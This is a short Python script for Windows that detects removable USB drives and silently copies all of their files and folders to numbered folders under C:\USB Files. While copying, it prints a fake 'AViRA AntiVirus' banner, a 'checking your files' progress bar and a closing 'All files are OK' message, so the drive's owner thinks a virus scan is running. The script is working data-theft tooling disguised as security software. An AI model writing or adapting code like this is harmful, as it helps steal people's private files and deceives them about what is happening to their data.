from win32file import GetDriveType , GetLogicalDrives , DRIVE_REMOVABLE
from os import chdir , listdir , path
from shutil import copytree , copyfile
from tqdm import tqdm

class Mains:
    def Reader(self):
## region First check:
        if "USB_num" not in listdir("C:\\USB Files"):
            f = open("C:\\USB Files\\USB_num", "w")
            f.close()
            self.usb_number()
        else:
            self.usb_number()


    def usb_number(self):
        chdir('C:\\USB Files\\')
        lister = listdir('.')
        Directories = []
        for i in lister:
            if path.isdir(i) == True:
                Directories.append(i)

        if len(Directories) == 0 :
            f = open("C:\\USB Files\\USB_num", "w")
            f.writelines("0")
            f.close()

        else:
            for i in Directories:
                i = int(i)
            maxs = int(max(Directories))
            # maxs += 1
            f = open("C:\\USB Files\\USB_num", "w")
            f.writelines(str(maxs))
            f.close()

## endregion

        f = open("C:\\USB Files\\USB_num", "r+")
        self.reader = f.readlines()
        self.reader = self.reader[0]
        f.close()

    def usbdrive(self):
        self.drive_list = []
        drivebits = GetLogicalDrives()
        for d in range(1,26):
            mask = 1 <<  d
            if drivebits & mask:
                drname=  '%c:\\' % chr(ord('A') + d)
                # print(drname)
                t = GetDriveType(drname)
                if t == DRIVE_REMOVABLE:
                    self.drive_list.append(drname)
        # return drive_list

        self.reader = int(self.reader) +  1
        f = open("C:\\USB Files\\USB_num", "w")
        f.writelines(str(self.reader))
        f.close()


    def copier(self):
        if len(self.drive_list) > 1 :
            x =0
            while x < len(self.drive_list):
                chdir(self.drive_list[x])
                self.copy()
                x += 1
        else:
            chdir(self.drive_list[0])
            self.copy()

    def copy(self):

        pwd = listdir('.')


        Files = []
        Directories = []

        for i in pwd:
            if path.isfile(i) == True:
                Files.append(i)
            else:
                Directories.append(i)

        print("\n****AViRA AntiVirus***"
        "\nInfo(tags/v3.7.6:43364a7ae0, Dec 29 2019, 00:42:30) [MSC v.1916 64 bit (AMD64)] on win32"
        "\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n"
        "Please wait while checking your files...\n")

        bar = tqdm(total=len(pwd))


        for dir in Directories:
            try:
                copytree(dir, "C:\\USB Files\\" + str(self.reader) + "\\" + dir)
                bar.update(1)
            except :
                bar.update(1)
        for file in Files:
            try:
                copyfile(file, "C:\\USB Files\\"  + str(self.reader) +  "\\"  + file)
                bar.update(1)
            except :
                bar.update(1)
        bar.close()

        print("\n=====No Thread Found=====\n\nAll files are OK.")


M = Mains()
M.Reader()
M.usbdrive()
M.copier()
input()

# os.chdir(drive[0])
# print(os.listdir('.'))

#
# # import usb
# # busses = usb.busses()
# # for bus in busses:
# #     devices = bus.devices
# #     for dev in devices:
# #         print("Device : " , dev.filename)
#
# # for dev in usb.core.find(find_all=True):
# #     print("Device : ", dev.filename)
